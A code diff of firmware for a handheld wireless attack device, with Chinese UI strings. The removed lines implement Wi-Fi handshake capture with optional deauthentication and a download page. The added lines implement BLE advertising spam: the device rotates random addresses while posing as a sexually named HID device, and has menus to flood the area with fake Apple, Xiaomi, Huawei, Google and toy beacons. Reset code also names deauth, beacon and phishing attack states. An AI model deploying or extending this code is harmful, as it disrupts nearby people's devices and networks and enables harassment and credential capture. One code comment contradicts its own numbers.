+static bool g_bleActiveAdvertising = false; // 跟踪BLE广播状态
+static unsigned long g_lastBleActivity = 0; // 最后BLE活动时间
+static bool g_bleResourcesInUse = false; // BLE资源使用标志
+
+// Get current rate delay in ms
+static int getBlePopupDelay() {
+  return BLE_RATE_OPTIONS[g_blePopupRateIndex];
+}
+
+// 强化的BLE资源清理函数
+static void performCompleteBleCleanup() {
+  Serial.println("=== 开始强化BLE资源清理 ===");
   
-  while (true) {
-    display.clearDisplay();
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    
-    // 标题 - 居中显示
-    const char* title = "快速抓包模式选择";
-    int titleWidth = u8g2_for_adafruit_gfx.getUTF8Width(title);
-    int titleCenterX = (display.width() - titleWidth) / 2;
-    if (titleCenterX < 0) titleCenterX = 0;
-    u8g2_for_adafruit_gfx.setCursor(titleCenterX, 15);
-    u8g2_for_adafruit_gfx.print(title);
-    
-    // 显示模式选项
-    for (int i = 0; i < 3; i++) {
-      int y = 25 + i * 14; // 增加行间距
-      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-      
-      // 计算文字居中位置 - 使用准确的UTF8宽度
-      int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(modeNames[i]);
-      int centerX = (display.width() - textWidth) / 2;
-      if (centerX < 0) centerX = 0;
-      
-      // 如果是当前选中的选项，在左右两侧显示箭头
-      if (i == modeState) {
-        // 左侧箭头
-        u8g2_for_adafruit_gfx.setCursor(centerX - 15, y + 8);
-        u8g2_for_adafruit_gfx.print("-");
-        
-        // 右侧箭头
-        u8g2_for_adafruit_gfx.setCursor(centerX + textWidth + 5, y + 8);
-        u8g2_for_adafruit_gfx.print(" -");
-      }
-      
-      // 显示选项文字
-      u8g2_for_adafruit_gfx.setCursor(centerX, y + 8);
-      u8g2_for_adafruit_gfx.print(modeNames[i]);
-    }
-    
-    
-    display.display();
-    
-    // 按键处理 - 使用防抖机制
-    static unsigned long lastKeyTime = 0;
-    static bool keyPressed = false;
-    
-    if (digitalRead(BTN_UP) == LOW) {
-      if (!keyPressed && millis() - lastKeyTime > 150) {
-        keyPressed = true;
-        lastKeyTime = millis();
-        if (modeState > 0) modeState--;
-      }
-    } else if (digitalRead(BTN_DOWN) == LOW) {
-      if (!keyPressed && millis() - lastKeyTime > 150) {
-        keyPressed = true;
-        lastKeyTime = millis();
-        if (modeState < 2) modeState++;
-      }
-    } else if (digitalRead(BTN_OK) == LOW) {
-      if (!keyPressed && millis() - lastKeyTime > 150) {
-        keyPressed = true;
-        lastKeyTime = millis();
-        quick_capture_mode = modeState;
-        startQuickCapture();
-        return;
-      }
-    } else if (digitalRead(BTN_BACK) == LOW) {
-      if (!keyPressed && millis() - lastKeyTime > 150) {
-        keyPressed = true;
-        lastKeyTime = millis();
-        return;
-      }
-    } else {
-      keyPressed = false;
-    }
-    
-    delay(20); // 减少主循环延迟
+  // 1. 标记BLE资源清理开始
+  g_bleResourcesInUse = false;
+  g_bleActiveAdvertising = false;
+  
+  // 2. 强制停止所有BLE广播
+  if (BLE.configAdvert()) {
+    Serial.println("停止BLE广播...");
+    BLE.configAdvert()->stopAdv();
+    delay(150); // 增加延时确保停止完成
+  }
+  
+  // 3. 清理BLE连接和服务
+  Serial.println("清理BLE连接和服务...");
+  BLE.end(); // 清理所有BLE服务和连接
+  delay(200);
+  
+  // 4. 完全去初始化BLE栈
+  Serial.println("去初始化BLE栈...");
+  BLE.deinit();
+  delay(300); // 增加延时确保完全清理
+  
+  // 5. 重置硬件状态
+  Serial.println("重置硬件状态...");
+  delay(200);
+  
+  // 6. 记录清理完成时间
+  g_lastBleActivity = millis();
+  
+  Serial.println("BLE资源清理完成");
+}
+
+// 检查是否可以安全启动WiFi功能
+static bool canSafelyStartWiFi() {
+  // 如果BLE资源仍在使用中，等待清理
+  if (g_bleResourcesInUse || g_bleActiveAdvertising) {
+    Serial.println("等待BLE资源清理...");
+    performCompleteBleCleanup();
+    return false;
+  }
+  
+  // 确保距离上次BLE活动有足够间隔
+  unsigned long timeSinceLastBle = millis() - g_lastBleActivity;
+  if (timeSinceLastBle < 1000) { // 至少等待1秒
+    Serial.print("等待BLE资源稳定 (");
+    Serial.print(1000 - timeSinceLastBle);
+    Serial.println(" ms)...");
+    delay(1000 - timeSinceLastBle);
+  }
+  
+  return true;
+}
+
+// 安全检查BLE状态（实现）
+static void checkBleResourcesForWiFi() {
+  // 如果BLE正在使用，执行强化清理
+  if (g_bleResourcesInUse || g_bleActiveAdvertising) {
+    Serial.println("检测到BLE活动，执行强化清理...");
+    performCompleteBleCleanup();
+    delay(200); // 给WiFi硬件恢复时间
   }
 }
 
-// 启动快速抓包
-void startQuickCapture() {
-  if (SelectedVector.empty()) {
-    if (showSelectSSIDConfirmModal()) {
-      drawssid(); // 进入AP/SSID选择页面
-    }
-    return;
+// 启动时强制重置所有状态（修复重启后问题）
+static void performStartupStateReset() {
+  // 先初始化显示并显示初始化信息
+  Serial.println("0. 初始化显示系统...");
+  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println(F("SSD1306 init failed"));
+    while (true);
   }
+  u8g2_for_adafruit_gfx.begin(display);
+  u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr);
   
-  // 设置目标网络
-  int selectedIndex = SelectedVector[0];
-  WiFiScanResult selected = scan_results[selectedIndex];
-  memcpy(_selectedNetwork.bssid, selected.bssid, 6);
-  _selectedNetwork.ssid = selected.ssid;
-  _selectedNetwork.ch = selected.channel;
-  AP_Channel = String(selected.channel);
-  
-  // 配置抓包模式
-  if (quick_capture_mode == 1) { // 被动模式
-    g_captureMode = CAPTURE_MODE_PASSIVE;
-    g_captureDeauthEnabled = false;
-    Serial.println("[QuickCapture] Mode: PASSIVE");
-  } else if (quick_capture_mode == 2) { // 高效模式
-    g_captureMode = CAPTURE_MODE_EFFICIENT;
-    g_captureDeauthEnabled = false;
-    Serial.println("[QuickCapture] Mode: EFFICIENT");
-  } else { // 主动模式
-    g_captureMode = CAPTURE_MODE_ACTIVE;
-    g_captureDeauthEnabled = true;
-    Serial.println("[QuickCapture] Mode: ACTIVE");
-  }
-  
-  Serial.print("[QuickCapture] Target: ");
-  Serial.print(_selectedNetwork.ssid);
-  Serial.print(" (");
-  Serial.print(macToString(_selectedNetwork.bssid, 6));
-  Serial.print(") CH");
-  Serial.println(_selectedNetwork.ch);
-  
-  // 重置抓包状态
-  isHandshakeCaptured = false;
-  handshakeDataAvailable = false;
-  resetCaptureData();
-  resetGlobalHandshakeData();
-  
-  // 启动抓包
-  quick_capture_active = true;
-  quick_capture_completed = false;
-  quick_capture_start_time = millis();
-  readyToSniff = true;
-  hs_sniffer_running = true;
-  
-  // 显示启动信息
+  // 显示"..."
   display.clearDisplay();
   u8g2_for_adafruit_gfx.setFontMode(1);
   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-  u8g2_for_adafruit_gfx.setCursor(5, 30);
-  u8g2_for_adafruit_gfx.print("正在启动抓包...");
-  display.display();
-  delay(1000);
-}
-
-// 显示快速抓包进度（非阻塞）
-void displayQuickCaptureProgress() {
-  static unsigned long lastUpdate = 0;
-  unsigned long currentTime = millis();
   
-  // 每500ms更新一次显示
-  if (currentTime - lastUpdate > 500) {
-    display.clearDisplay();
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    
-    // 标题
-    u8g2_for_adafruit_gfx.setCursor(5, 15);
-    u8g2_for_adafruit_gfx.print("快速抓包进行中...");
-    
-    // 显示目标网络信息
-    u8g2_for_adafruit_gfx.setCursor(5, 25);
-    u8g2_for_adafruit_gfx.print("目标: ");
-    String ssidDisplay = _selectedNetwork.ssid.length() > 8 ? _selectedNetwork.ssid.substring(0, 8) + "..." : _selectedNetwork.ssid;
-    u8g2_for_adafruit_gfx.print(ssidDisplay);
-    
-    // 显示抓包统计
-    u8g2_for_adafruit_gfx.setCursor(5, 35);
-    u8g2_for_adafruit_gfx.print("握手帧: ");
-    u8g2_for_adafruit_gfx.print(capturedHandshake.frameCount);
-    u8g2_for_adafruit_gfx.print("/4");
-    
-    u8g2_for_adafruit_gfx.setCursor(5, 45);
-    u8g2_for_adafruit_gfx.print("管理帧: ");
-    u8g2_for_adafruit_gfx.print(capturedManagement.frameCount);
-    u8g2_for_adafruit_gfx.print("/10");
-    
-    // 显示运行时间
-    u8g2_for_adafruit_gfx.setCursor(5, 55);
-    u8g2_for_adafruit_gfx.print("时间: ");
-    u8g2_for_adafruit_gfx.print((currentTime - quick_capture_start_time) / 1000);
-    u8g2_for_adafruit_gfx.print("s");
-    
-    display.display();
-    lastUpdate = currentTime;
-  }
+  const char* initText = "...";
+  int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(initText);
+  int x = (display.width() - textWidth) / 2;
+  if (x < 0) x = 0;
+  u8g2_for_adafruit_gfx.setCursor(x, 32);
+  u8g2_for_adafruit_gfx.print(initText);
+  display.display();
+  
+  Serial.println("1. 重置BLE状态变量...");
+  g_bleResourcesInUse = false;
+  g_bleActiveAdvertising = false;
+  g_lastBleActivity = 0;
+  
+  Serial.println("2. 清理WiFi扫描结果...");
+  scan_results.clear();
+  scan_results.shrink_to_fit(); // 释放内存
+  SelectedVector.clear();
+  SelectedVector.shrink_to_fit();
+  selectedFlags.clear();
+  selectedFlags.shrink_to_fit();
+  g_scanDone = false;
+  
+  Serial.println("3. 重置Web服务状态...");
+  web_ui_active = false;
+  web_test_active = false;
+  web_server_active = false;
+  dns_server_active = false;
+  g_webTestLocked = false;  // 允许钓鱼功能重复启动
+  g_webUILocked = false;     // Web UI保持一次性限制
+  
+  Serial.println("4. 重置攻击状态...");
+  deauthAttackRunning = false;
+  beaconAttackRunning = false;
+  attackstate = 0;
+  becaonstate = 0;
+  g_attackDetectRunning = false;
+  g_packetDetectRunning = false;
+  
+  Serial.println("5. 强制WiFi硬件重置...");
+  wifi_off();
+  delay(500); // 增加延时确保完全关闭
+  wifi_on(RTW_MODE_AP);
+  delay(500); // 增加延时确保完全启动
+  
+  Serial.println("6. 清理内存碎片...");
+  // 强制垃圾回收（如果平台支持）
+  delay(100);
+  
+  Serial.println("启动状态重置完成");
 }
 
-// 抓包完成界面
-void drawQuickCaptureComplete() {
-  int menuState = 0; // 0=启动Web服务, 1=返回主菜单
+// Handle rate control UI and return true if rate changed
+static bool handleBlePopupRateControl() {
+  static unsigned long lastBleUpTime = 0, lastBleDownTime = 0;
+  unsigned long now = millis();
+  bool rateChanged = false;
+  
+  // Handle UP button - decrease delay (increase rate)
+  if (digitalRead(BTN_UP) == LOW && (now - lastBleUpTime > 300)) {
+    lastBleUpTime = now;
+    if (g_blePopupRateIndex > 0) {
+      g_blePopupRateIndex--;
+      rateChanged = true;
+    }
+  }
+  
+  // Handle DOWN button - increase delay (decrease rate)  
+  if (digitalRead(BTN_DOWN) == LOW && (now - lastBleDownTime > 300)) {
+    lastBleDownTime = now;
+    if (g_blePopupRateIndex < BLE_RATE_COUNT - 1) {
+      g_blePopupRateIndex++;
+      rateChanged = true;
+    }
+  }
+  
+  return rateChanged;
+}
+
+// Common BLE popup display with rate control
+static void drawBlePopupDisplay(const char* title) {
+  display.clearDisplay();
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  oledDrawCenteredLine(title, 12);
+  String rateStr = "速率と延时: " + String(getBlePopupDelay()) + "ms";
+  oledDrawCenteredLine(rateStr.c_str(), 28);
+  oledDrawCenteredLine("UP/DOWN调节", 44);
+  oledDrawCenteredLine("BACK 返回", 56);
+  display.display();
+}
+
+// Common BLE popup rate control handler for main loop
+static bool handleBlePopupMainLoop(const char* title, unsigned long& lastDisplayUpdate) {
+  if (digitalRead(BTN_BACK) == LOW) { 
+    delay(200); 
+    return true; // Exit
+  }
+  
+  // Handle rate control and update display only if rate changed
+  bool rateChanged = handleBlePopupRateControl();
+  unsigned long now = millis();
+  // 减少刷新频率，避免闪烁：只在速率改变时刷新，或者每3秒刷新一次
+  if (rateChanged || (now - lastDisplayUpdate > 3000)) {
+    drawBlePopupDisplay(title);
+    lastDisplayUpdate = now;
+  }
+  
+  return false; // Continue
+}
+
+// Common BLE popup rate control handler for delay loop
+static bool handleBlePopupDelayLoop(const char* title, unsigned long& lastDisplayUpdate) {
+  if (digitalRead(BTN_BACK) == LOW) return true; // Exit delay loop
+  
+  // Check for rate control during delay - 只在速率改变时刷新屏幕
+  if (handleBlePopupRateControl()) {
+    drawBlePopupDisplay(title);
+    lastDisplayUpdate = millis();
+  }
+  
+  return false; // Continue delay
+}
+
+// BLE headset-like advertising test
+void bleHeadsetTest() {
+  // OLED UI: show status
+  display.clearDisplay();
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  oledDrawCenteredLine("[蓝牙信标发送]", 25);
+  oledDrawCenteredLine("按BACK退出", 50);
+  display.display();
+
+  // 标记BLE资源开始使用
+  g_bleResourcesInUse = true;
+  g_bleActiveAdvertising = false; // 初始状态
+  g_lastBleActivity = millis();
+
+  // Initialize BLE and configure non-connectable advertising
+  BLE.init();
+  BLE.setDeviceName("按摩震动棒");
+  BLE.setDeviceAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
+
+  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  BLE.configAdvert()->setMinInterval(80);  // 50ms
+  BLE.configAdvert()->setMaxInterval(160); // 100ms
+
+  // Start peripheral mode (advertising only, non-connectable)
+  BLE.beginPeripheral();
+
+  // Generate a pool of STATIC random addresses (减少内存使用)
+  const uint8_t maxClones = 20; // 从10减少到20以节省内存
+  static uint8_t addrPool[maxClones][6];
+  for (uint8_t i = 0; i < maxClones; i++) {
+    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, addrPool[i]) != GAP_CAUSE_SUCCESS) {
+      le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, addrPool[i]);
+    }
+  }
+  // Ensure advertising uses RANDOM local address type
+  uint8_t local_bd_type = GAP_LOCAL_ADDR_LE_RANDOM;
+  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(local_bd_type), &local_bd_type);
+
+  const uint16_t perCloneMs = 80; // 减少切换延时，提高切换速度
+  uint8_t idx = 0;
+
+  while (true) {
+    if (digitalRead(BTN_BACK) == LOW) { delay(200); break; }
+
+    // Stop current advertising to switch address and name
+    BLE.configAdvert()->stopAdv();
+
+    // Set next address from pool
+    le_set_rand_addr(addrPool[idx]);
+    delay(20);
+
+    // Build advert payloads
+    BLEAdvertData cadv; BLEAdvertData cscn;
+    cadv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    char namebuf[24];
+    snprintf(namebuf, sizeof(namebuf), "按摩震动棒");
+    cadv.addCompleteName(namebuf);
+    cadv.addAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
+    cadv.addCompleteServices(BLEUUID("1812"));
+    uint8_t mfg[8]; uint16_t company = 0xFFFF;
+    mfg[0] = 7; mfg[1] = 0xFF; mfg[2] = (uint8_t)(company & 0xFF); mfg[3] = (uint8_t)(company >> 8);
+    mfg[4] = idx; mfg[5] = addrPool[idx][3]; mfg[6] = addrPool[idx][4]; mfg[7] = addrPool[idx][5];
+    cadv.addData(mfg, sizeof(mfg));
+    cscn.addAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
+    BLE.configAdvert()->setAdvData(cadv);
+    BLE.configAdvert()->setScanRspData(cscn);
+    BLE.configAdvert()->updateAdvertParams();
+
+    // Restart advertising
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    while (millis() - start < perCloneMs) { if (digitalRead(BTN_BACK) == LOW) break; delay(10); }
+    idx = (uint8_t)((idx + 1) % maxClones);
+  }
+
+  // Stop BLE and clean up resources
+  Serial.println("停止BLE广播并清理资源...");
+  BLE.configAdvert()->stopAdv();
+  g_bleActiveAdvertising = false;
+  delay(100);
+  BLE.deinit();
+  g_bleResourcesInUse = false;
+  g_lastBleActivity = millis();
+  Serial.println("BLE资源清理完成");
+}
+
+// ===== Generic BLE Menu System Implementation =====
+
+// BLE子菜单返回控制
+static bool g_shouldExitBleSubMenu = false;
+
+void bleBackToBleMenu() {
+  g_shouldExitBleSubMenu = true;
+}
+
+void showGenericBleMenu(const char* /* title */, const BleMenuItem* items, int itemCount) {
+  static int g_genericBleState = 0;
+  static int g_genericBleStartIndex = 0;
+  
+  const int ITEM_H = 16;
+  const int Y_OFF = 2;
+  const int MAX_DISPLAY_ITEMS = 4;
+  
+  // 重置选择状态
+  g_genericBleState = 0;
+  g_genericBleStartIndex = 0;
+  
+  unsigned long lastUpTime = 0, lastDownTime = 0, lastOkTime = 0, lastBackTime = 0;
   
   while (true) {
-    display.clearDisplay();
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    unsigned long now = millis();
     
-    // 标题
-    u8g2_for_adafruit_gfx.setCursor(5, 15);
-    u8g2_for_adafruit_gfx.print("抓包完成!");
-    
-    // 显示统计信息
-    u8g2_for_adafruit_gfx.setCursor(5, 25);
-    u8g2_for_adafruit_gfx.print("握手帧: ");
-    u8g2_for_adafruit_gfx.print(capturedHandshake.frameCount);
-    u8g2_for_adafruit_gfx.print("/4");
-    
-    u8g2_for_adafruit_gfx.setCursor(5, 35);
-    u8g2_for_adafruit_gfx.print("管理帧: ");
-    u8g2_for_adafruit_gfx.print(capturedManagement.frameCount);
-    u8g2_for_adafruit_gfx.print("/10");
-    
-    u8g2_for_adafruit_gfx.setCursor(5, 45);
-    u8g2_for_adafruit_gfx.print("用时: ");
-    u8g2_for_adafruit_gfx.print((quick_capture_end_time - quick_capture_start_time) / 1000);
-    u8g2_for_adafruit_gfx.print("s");
-    
-    // 显示菜单选项
-    const char* menuItems[] = {"启动Web服务", "返回主菜单"};
-    for (int i = 0; i < 2; i++) {
-      int y = 55 + i * 12;
-      if (i == menuState) {
-        display.fillRoundRect(0, y-2, 128, 12, 2, SSD1306_WHITE);
-        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
-      } else {
-        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    // 处理BACK按键
+    if (digitalRead(BTN_BACK) == LOW) {
+      if (now - lastBackTime > DEBOUNCE_DELAY) {
+        lastBackTime = now;
+        // 等待按键释放，避免主循环立即检测到返回键
+        while(digitalRead(BTN_BACK) == LOW) { delay(10); }
+        return;
       }
-      u8g2_for_adafruit_gfx.setCursor(5, y + 8);
-      u8g2_for_adafruit_gfx.print(menuItems[i]);
     }
     
-    display.display();
-    
-    // 按键处理
-    if (digitalRead(BTN_UP) == LOW) {
-      delay(200);
-      if (menuState > 0) menuState--;
-    }
-    if (digitalRead(BTN_DOWN) == LOW) {
-      delay(200);
-      if (menuState < 1) menuState++;
-    }
+    // 处理OK按键
     if (digitalRead(BTN_OK) == LOW) {
-      delay(200);
-      if (menuState == 0) {
-        // 启动Web服务
-        startWebServiceForCapture();
-        // 显示Web服务信息
-        drawWebServiceInfo();
-        return;
-      } else {
-        // 返回主菜单
-        return;
+      if (now - lastOkTime > DEBOUNCE_DELAY) {
+        lastOkTime = now;
+        stabilizeButtonState();
+        
+        int selIndex = g_genericBleStartIndex + g_genericBleState;
+        if (selIndex >= 0 && selIndex < itemCount && items[selIndex].action) {
+          // 重置退出标志
+          g_shouldExitBleSubMenu = false;
+          items[selIndex].action();
+          
+          // 检查是否需要退出子菜单
+          if (g_shouldExitBleSubMenu) {
+            g_shouldExitBleSubMenu = false;
+            return;
+          }
+        }
+        // 不要return，继续菜单循环
       }
     }
-    if (digitalRead(BTN_BACK) == LOW) {
-      delay(200);
-      return;
+    
+    // 处理UP按键
+    if (digitalRead(BTN_UP) == LOW) {
+      if (now - lastUpTime > DEBOUNCE_DELAY) {
+        if (g_genericBleState > 0) {
+          int yFrom = Y_OFF + g_genericBleState * ITEM_H;
+          g_genericBleState--;
+          int yTo = Y_OFF + g_genericBleState * ITEM_H;
+          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
+        } else if (g_genericBleStartIndex > 0) {
+          g_genericBleStartIndex--;
+          int yFrom = Y_OFF + 1 * ITEM_H;
+          int yTo = Y_OFF + 0 * ITEM_H;
+          g_genericBleState = 0;
+          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
+        }
+        lastUpTime = now;
+      }
     }
-    delay(50);
+    
+    // 处理DOWN按键
+    if (digitalRead(BTN_DOWN) == LOW) {
+      if (now - lastDownTime > DEBOUNCE_DELAY) {
+        if (g_genericBleState < MAX_DISPLAY_ITEMS - 1 && (g_genericBleStartIndex + g_genericBleState) < itemCount - 1) {
+          int yFrom = Y_OFF + g_genericBleState * ITEM_H;
+          g_genericBleState++;
+          int yTo = Y_OFF + g_genericBleState * ITEM_H;
+          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
+        } else if ((g_genericBleStartIndex + MAX_DISPLAY_ITEMS) < itemCount) {
+          g_genericBleStartIndex++;
+          int yFrom = Y_OFF + (MAX_DISPLAY_ITEMS - 2) * ITEM_H;
+          int yTo = Y_OFF + (MAX_DISPLAY_ITEMS - 1) * ITEM_H;
+          g_genericBleState = MAX_DISPLAY_ITEMS - 1;
+          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
+        }
+        lastDownTime = now;
+      }
+    }
+    
+    // 主绘制循环 - 完全按照原始代码的方式
+    display.clearDisplay();
+    drawGenericBleMenuBase(items, itemCount, g_genericBleStartIndex);
+    int rectY = Y_OFF + g_genericBleState * ITEM_H;
+    display.drawRoundRect(0, rectY - 2, display.width(), 14, 2, SSD1306_WHITE);
+    display.display();
+    delay(40);
   }
 }
 
-// 抓包超时界面
-void drawQuickCaptureTimeout() {
-  while (true) {
-    display.clearDisplay();
+static void drawGenericBleMenuBase(const BleMenuItem* items, int itemCount, int startIndex) {
+  display.clearDisplay();
+  const int ITEM_H = 16;
+  const int Y_OFF = 2;
+  const int MAX_DISPLAY_ITEMS = 4;
+  
+  // 完全按照原始蓝牙弹窗菜单的方式绘制
+  for (int i = 0; i < MAX_DISPLAY_ITEMS && (startIndex + i) < itemCount; i++) {
+    int yPos = Y_OFF + i * ITEM_H;
     u8g2_for_adafruit_gfx.setFontMode(1);
     u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    
-    u8g2_for_adafruit_gfx.setCursor(5, 20);
-    u8g2_for_adafruit_gfx.print("抓包超时");
-    
-    u8g2_for_adafruit_gfx.setCursor(5, 35);
-    u8g2_for_adafruit_gfx.print("未捕获到完整握手包");
-    
-    u8g2_for_adafruit_gfx.setCursor(5, 50);
-    u8g2_for_adafruit_gfx.print("《 返回主菜单");
-    
-    display.display();
-    
-    if (digitalRead(BTN_BACK) == LOW) {
-      delay(200);
+    u8g2_for_adafruit_gfx.setCursor(5, yPos + 10);
+    u8g2_for_adafruit_gfx.print(items[startIndex + i].label);
+    drawRightChevron(yPos - 2, 14, false);
+  }
+}
+
+static void animateGenericBleMenu(int yFrom, int yTo, int rectHeight, const BleMenuItem* items, int itemCount, int startIndex) {
+  // 完全按照原始动画代码
+  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
+  const int width = display.width();
+  unsigned long nextStepDeadline = millis() + delayPerStepMs;
+  
+  for (int s = 1; s <= ANIM_STEPS; s++) {
+    int y = yFrom + ((yTo - yFrom) * s) / ANIM_STEPS;
+    drawGenericBleMenuBase(items, itemCount, startIndex);
+    display.drawRoundRect(0, y, width, rectHeight, 2, SSD1306_WHITE);
+    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) display.display();
+    while ((long)(millis() - nextStepDeadline) < 0) { }
+    nextStepDeadline += delayPerStepMs;
+  }
+}
+
+// ===== Enhanced BLE Beacon Device Menu =====
+
+void bleBeaconDeviceMenu() {
+  // 定义信标设备菜单项
+  static const BleMenuItem beaconMenuItems[] = {
+    {"广播:Apple全家桶", bleBeaconAppleAction},
+    {"广播:小米全家桶", bleBeaconXiaomiAction},
+    {"广播:华为全家桶", bleBeaconHuaweiAction},
+    {"广播:Google全家桶", bleBeaconGoogleAction},
+    {"广播:米家大杂烩", bleBeaconMixedAction},
+    {"广播:罕见设备", bleBeaconMiscAction},
+    {"广播:儿童玩具", bleBeaconToyAction},
+    {"← 返回BLE菜单", bleBackToBleMenu}
+  };
+  static const int beaconMenuCount = sizeof(beaconMenuItems) / sizeof(beaconMenuItems[0]);
+  
+  showGenericBleMenu("蓝牙信标广播", beaconMenuItems, beaconMenuCount);
+}
+
+// BLE信标设备类别回调函数实现
+void bleBeaconAppleAction() {
+  if (showConfirmModal("启动Apple设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_APPLE);
+  }
+}
+
+void bleBeaconXiaomiAction() {
+  if (showConfirmModal("启动小米设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_XIAOMI);
+  }
+}
+
+void bleBeaconToyAction() {
+  if (showConfirmModal("启动玩具设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_TOY);
+  }
+}
+
+void bleBeaconHuaweiAction() {
+  if (showConfirmModal("启动华为设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_HUAWEI);
+  }
+}
+
+void bleBeaconGoogleAction() {
+  if (showConfirmModal("启动Google设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_GOOGLE);
+  }
+}
+
+void bleBeaconMiscAction() {
+  if (showConfirmModal("启动罕见设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_MISC);
+  }
+}
+
+void bleBeaconMixedAction() {
+  if (showConfirmModal("启动米家大杂烩广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_MIXED);
+  }
+}
+
+// ===== Enhanced BLE Beacon Broadcast Function =====
+void bleBeaconBroadcast(BleDeviceCategory category) {
+  const BleBeaconDevice* devices = nullptr;
+  int deviceCount = 0;
+  const char* categoryName = "";
+  
+  // 根据类别选择设备数组
+  switch (category) {
+    case BLE_CATEGORY_APPLE:
+      devices = g_appleDevices;
+      deviceCount = g_appleDeviceCount;
+      categoryName = "Apple全家桶";
+      break;
+    case BLE_CATEGORY_XIAOMI:
+      devices = g_xiaomiDevices;
+      deviceCount = g_xiaomiDeviceCount;
+      categoryName = "小米全家桶";
+      break;
+    case BLE_CATEGORY_TOY:
+      devices = g_toyDevices;
+      deviceCount = g_toyDeviceCount;
+      categoryName = "儿童玩具";
+      break;
+    case BLE_CATEGORY_HUAWEI:
+      devices = g_huaweiDevices;
+      deviceCount = g_huaweiDeviceCount;
+      categoryName = "华为全家桶";
+      break;
+    case BLE_CATEGORY_GOOGLE:
+      devices = g_googleDevices;
+      deviceCount = g_googleDeviceCount;
+      categoryName = "Google全家桶";
+      break;
+    case BLE_CATEGORY_MIXED:
+      devices = g_mixedDevices;
+      deviceCount = g_mixedDeviceCount;
+      categoryName = "米家大杂烩";
+      break;
+    case BLE_CATEGORY_MISC:
+      devices = g_miscDevices;
+      deviceCount = g_miscDeviceCount;
+      categoryName = "罕见设备";
+      break;
+    default:
       return;
-    }
-    delay(50);
-  }
-}
-
-// 启动Web服务用于抓包下载
-void startWebServiceForCapture() {
-  Serial.println("=== 启动快速抓包Web服务 ===");
-  
-  // 清理之前的服务
-  stopWebServer();
-  stopDNSServer();
-  disconnectWiFi();
-  cleanupClients();
-  
-  // 等待网络完全断开
-  delay(2000);
-  
-  // 启动AP模式
-  Serial.println("启动抓包Web服务AP模式...");
-  char channel_str[4];
-  sprintf(channel_str, "%d", WEB_UI_CHANNEL);
-  
-  // 重试机制
-  int retryCount = 0;
-  bool apStarted = false;
-  while (retryCount < 3 && !apStarted) {
-    if (WiFi.apbegin(WEB_UI_SSID, WEB_UI_PASSWORD, channel_str, 0)) {
-      apStarted = true;
-      Serial.println("抓包Web服务AP模式启动成功");
-    } else {
-      retryCount++;
-      Serial.print("抓包Web服务AP模式启动失败，重试 ");
-      Serial.print(retryCount);
-      Serial.println("/3");
-      delay(1000);
-    }
   }
   
-  if (apStarted) {
-    Serial.println("SSID: " + String(WEB_UI_SSID));
-    Serial.println("密码: " + String(WEB_UI_PASSWORD));
-    Serial.println("信道: " + String(WEB_UI_CHANNEL));
-    
-    // 等待AP完全启动
-    delay(2000);
-    
-    IPAddress apIp = WiFi.localIP();
-    Serial.print("IP地址: ");
-    Serial.println(apIp);
-    
-    // 启动Web服务
-    startWebUIServices(apIp);
-    
-    Serial.println("抓包Web服务启动完成");
-  } else {
-    Serial.println("抓包Web服务AP模式启动失败，已重试3次");
-  }
-}
-
-// 发送快速抓包完成页面
-void sendQuickCapturePage(WiFiClient& client) {
-  String html = "<!DOCTYPE html><html><head>";
-  html += "<meta charset='UTF-8'>";
-  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
-  html += "<title>快速抓包完成</title>";
-  html += "<style>";
-  html += "body{font-family:Arial,sans-serif;margin:0;padding:20px;background:#f5f5f5;}";
-  html += ".container{max-width:600px;margin:0 auto;background:white;padding:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}";
-  html += "h1{color:#333;text-align:center;margin-bottom:30px;}";
